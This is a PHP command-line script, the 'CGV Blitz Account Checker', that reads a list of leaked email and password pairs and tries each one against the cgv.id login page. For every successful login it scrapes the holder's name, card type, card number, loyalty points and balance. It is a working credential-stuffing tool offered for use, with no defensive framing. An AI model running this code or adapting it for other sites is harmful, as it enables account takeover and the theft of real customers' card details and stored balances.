<?php
class CGVFreakz {
    public function CurlPost($url, $data = null, $header = array()){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        if(isset($data) && !empty($data)){
            $isi = '';
            foreach($data as $key=>$value){
                $isi .= $key.'='.$value.'&';
            }
            $this->clean($isi, '&');
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, count($isi));
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
        }
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    public function GetStr($start,$end,$string){
        $a = explode($start,$string);
        $b = explode($end,$a[1]);
        return (isset($b[0]) ? $b[0] : false);
    }
    public function clean($string){
        return str_replace(array("\n\r", "\n", "\r","\t", " "), "", $string);
    }
    public function ExecuteChecker($email,$password,$line){
        $checkLogin = $this->CurlPost("https://www.cgv.id/en/user/login",array("email" => $email,"password" => $password));
        if(isset($checkLogin) && !empty($checkLogin) && preg_match('/logout/i',$checkLogin)){
        $ballance = $this->clean($this->GetStr('<h3>Balance</h3>','</div>',$checkLogin));
            $point = ($this->GetStr('<h3>Points</h3>','</div>',$checkLogin));
            $type = ($this->GetStr('<li>Type<span>: ','</span></li>',$checkLogin));
            $card = ($this->GetStr('<li>Card Number<span>: ','</span></li>',$checkLogin));
            $name = ($this->GetStr('<div class="vcard-name">',' <a href=',$checkLogin));
            return "[ ".date("h:i:s")." | FathurFreakz ] ". $email ." - ". $password ." - ". $this->clean($name) ." - ". $this->clean($type) ." - ". $this->clean($card) ." - ". $this->clean($point) ." - ". $this->clean($ballance) ." ". $line;
        } else {
            return "[ ".date("h:i:s")." | FathurFreakz ] ". $email ." - ". $password ." INVALID !!! ".$line;
        }
    }
    public function StartingEngine(){
        $logo = "
##############################################################
        CGV Blitz Account Checker           
    Coded By     : Ramdhan Syaputra                 
    Date        : 21/12/2016               
    Thanks to     : Fikri acf.               
    Copyleft    : @ ".date("Y")."           
    Usage        : php cgv.php file delimiter
##############################################################
";
        echo ($logo);
           
    }
}
$cgv = new CGVFreakz;
if(isset($argv[1]) && !empty($argv[1])){
    $cgv->StartingEngine();
    $list = file_get_contents($argv[1]) or die("Tidak Bisa Menemukan File !");
    $delimiter = (!isset($argv[2]) ? "|" : $argv[2]);
    $count = explode("\n", $list);
    echo "\nStarting Engine ... !\n[ ".count($count)." ] Account Loaded !!!\n";
    for($i=1;$i<=count($count);$i++){
        $check = explode($delimiter,$count[$i]);
        echo($cgv->ExecuteChecker($check[0],$check[1],"(".$i."/".count($count).")\n"));
    }
} else {
    $cgv->StartingEngine();
}
?>
